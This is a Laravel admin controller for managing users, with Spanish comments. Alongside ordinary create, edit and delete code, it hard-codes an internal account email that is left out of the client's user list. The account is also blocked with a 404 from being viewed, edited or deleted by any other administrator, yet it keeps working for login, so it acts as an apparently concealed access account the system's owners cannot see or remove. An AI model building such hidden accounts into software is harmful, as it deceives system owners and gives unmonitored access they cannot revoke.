<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Validation\Rule;
use Inertia\Inertia;

class UserController extends Controller
{
    /**
     * Cuentas internas (soporte/desarrollo) que NO se muestran ni se pueden
     * gestionar desde el panel de Usuarios del cliente. Siguen funcionando para
     * iniciar sesión; solo quedan ocultas del mantenedor.
     */
    private const HIDDEN_EMAILS = ['yohan@nexbu.com'];

    public function index()
    {
        $users = User::whereNotIn('email', self::HIDDEN_EMAILS)
            ->orderBy('created_at', 'desc')
            ->get();

        return Inertia::render('admin/users/index', [
            'users' => $users,
        ]);
    }

    public function create()
    {
        return Inertia::render('admin/users/create');
    }

    public function store(Request $request)
    {
        $validated = $request->validate([
            'name' => ['required', 'string', 'max:255'],
            'email' => ['required', 'email', 'max:255', 'unique:users'],
            'password' => ['required', 'string', 'min:8', 'confirmed'],
            'is_admin' => ['boolean'],
        ]);

        User::create([
            'name' => $validated['name'],
            'email' => $validated['email'],
            'password' => Hash::make($validated['password']),
            'is_admin' => $validated['is_admin'] ?? false,
            'email_verified_at' => now(),
        ]);

        return redirect()->route('admin.users.index')
            ->with('success', 'Usuario creado correctamente.');
    }

    public function edit(User $user)
    {
        $this->abortIfHidden($user);

        return Inertia::render('admin/users/edit', [
            'user' => $user,
        ]);
    }

    public function update(Request $request, User $user)
    {
        $this->abortIfHidden($user);

        $validated = $request->validate([
            'name' => ['required', 'string', 'max:255'],
            'email' => ['required', 'email', 'max:255', Rule::unique('users')->ignore($user->id)],
            'password' => ['nullable', 'string', 'min:8', 'confirmed'],
            'is_admin' => ['boolean'],
        ]);

        $user->name = $validated['name'];
        $user->email = $validated['email'];
        $user->is_admin = $validated['is_admin'] ?? false;

        if (! empty($validated['password'])) {
            $user->password = Hash::make($validated['password']);
        }

        $user->save();

        return redirect()->route('admin.users.index')
            ->with('success', 'Usuario actualizado correctamente.');
    }

    public function destroy(User $user)
    {
        $this->abortIfHidden($user);

        if ($user->id === auth()->id()) {
            return back()->with('error', 'No puedes eliminar tu propia cuenta.');
        }

        $user->delete();

        return redirect()->route('admin.users.index')
            ->with('success', 'Usuario eliminado correctamente.');
    }

    /**
     * Las cuentas internas ocultas no se pueden gestionar desde el mantenedor.
     * EXCEPCIÓN: el propio dueño SÍ puede ver/editar su perfil (el link "perfil"
     * del sidebar apunta a /admin/users/{id}/edit). Solo se bloquea que OTROS la
     * abran por URL directa.
     */
    private function abortIfHidden(User $user): void
    {
        if ($user->id === auth()->id()) {
            return;
        }

        abort_if(in_array($user->email, self::HIDDEN_EMAILS, true), 404);
    }
}
